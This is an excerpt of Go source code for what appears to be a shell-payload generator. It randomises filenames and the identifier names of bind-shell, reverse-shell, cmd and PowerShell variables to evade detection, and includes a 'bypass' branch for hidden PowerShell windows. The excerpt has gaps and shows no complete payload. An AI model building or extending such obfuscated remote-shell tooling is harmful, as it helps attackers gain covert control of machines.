...
const (
	...
	charBytesLong = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
...
func randstrgen(n int, charset string) string { // NOW with more R@ND0M! Credit goes to Go Playground found here: https://play.golang.org/p/KcuJ_2c_NDj
	a := make([]byte, n)
	for j, cache, remain := n-1, src.Int63(), charIdxMax; j >= 0; {
		if remain == 0 {
			cache, remain = src.Int63(), charIdxMax
		}
		if idx := int(cache & charIdxMask); idx < len(charset) {
			a[j] = charset[idx]
			j--
		}
		cache >>= charIdxBits
...
func randInt(min, max int) int { // Return a random number between a minimum and maximum value.
...
func genfunc() {
	_ = randstrgen(rand.Intn(len(charBytes)), charBytes)                                            // Used to generate first random value (usually a single character)
	_ = ""                                                                                          // and set it to nothing
	randname := randstrgen(randInt(rand.Intn(len(charBytesLong)), randInt(43, 252)), charBytesLong) // Multiple randomized ranges given to help generate an entropic filename.
	...
	namefile := outfile
	bindshell, revshell, netstr, addrval, shellstr, connstr, bindconn, listenstr, cmdstr, syscmdStr, socketStr, streamStr, writerStr, bufferStr, encodingStr, readStr, resStr, outStr, argsStr, pinfoStr, pStr, stdoutStr, stderrStr, wincmdStr := randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes)
	randaddr, randsocket, randbinstr, randshstr, randsysstr, randbusystr, randcstr, randwinstr, randsys32str, randsys64str, randcmdexe, randwinpwshstr, randvonestr, randpwshexe, randTstr, randCstr, randPstr := randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes)
	netval := "tcp"
	unixArray := []string{"linux", "freebsd", "nacl", "netbsd", "openbsd", "plan9", "solaris", "dragonfly", "darwin"}
	...
	if cmdORpwsh == "bypass" {
		...
		randcmd1, randoct1, randcmd2, randoct2, randcmd3, randcmd4, randcmd5, randoct3, randcmd6, randoct4, randcmd7, randtac, randwindow, randstyle, randhidden := randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes), randstrgen(randInt(1, len(charBytes)), charBytes)
...
func main() {
	rand.Seed(time.Now().UnixNano()) // Begin random seed.
	if len(os.Args) < 2 {
